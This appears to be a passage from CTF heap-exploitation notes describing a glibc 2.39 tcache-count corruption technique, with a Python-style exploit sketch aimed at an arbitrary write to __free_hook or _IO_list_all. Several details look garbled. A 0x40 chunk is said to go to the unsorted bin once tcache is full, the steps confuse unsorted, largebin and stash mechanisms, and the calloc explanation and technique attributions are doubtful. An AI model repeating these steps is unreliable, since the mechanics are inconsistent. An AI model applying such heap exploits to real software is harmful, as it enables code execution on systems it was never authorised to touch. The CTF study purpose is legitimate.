1. Fill tcache bin (count 7) for size `0x40` so next `free(0x40)` goes to unsorted bin instead of tcache.
2. Use UAF to corrupt the tcache count byte for another size (or the same size) to `0xff`, allowing an extra `malloc` to underflow the count and later write out-of-bounds via tcache stash.
3. Free a large chunk (>0x400) that lands in unsorted bin, then allocate to trigger largebin sorting that writes `main_arena` to a tcache `next` pointer.

**Minimal exploit sketch:**

```python
# 1. Fill tcache 0x40 count to 7
chunks = [malloc(0x40) for _ in range(8)]
for c in chunks[:7]:
    free(c)                      # tcache count = 7 (full)
free(chunks[7])                  # 8th free → unsorted bin (not tcache)
# chunks[7] now in unsorted with fd/bk = main_arena+...

# 2. Corrupt tcache count for 0x40 to 0xff via UAF on tcache_perthread_struct
#    tcache_perthread_struct is allocated at heap base via first malloc
#    Overflow from adjacent chunk into counts[bin_index] byte
edit(overflow_chunk, p16(0xffff))  # set count byte to large value

# 3. Drain tcache to trigger stashing unlink (see tcache Stashing Unlink Attack)
#    Now malloc from largebin will stash remaining chunks into tcache,
#    and corrupted count allows writing main_arena pointer to arbitrary target
for _ in range(7):
    malloc(0x40)

# 4. Corrupt unsorted chunk's bk to target-0x10
edit(unsorted_chunk, bk=target-0x10)
malloc(0x40)  # stashes bk → target gets linked into tcache → next malloc returns target
malloc(0x40)
pwn = malloc(0x40)  # == target → arbitrary write (e.g., __free_hook / _IO_list_all)
```

**Why 2.39 matters:** Before 2.39, `calloc` bypassed tcache, so House of Tangerine's `count` corruption could be stabilized with `calloc` allocations that didn't affect counts. On 2.39, `calloc` decrements the same `counts[]` byte, so the attacker must account for it or use `count 7` saturation to force unsorted bin path explicitly.

**References:** House of Tangerine — 2024 CTF, glibc 2.39 adaptation of House of Muney / tcache stash.

For CTF-specific UAF, tcache, and custom-allocator writeup variants, continue in [heap-techniques-2.md](heap-techniques-2.md).
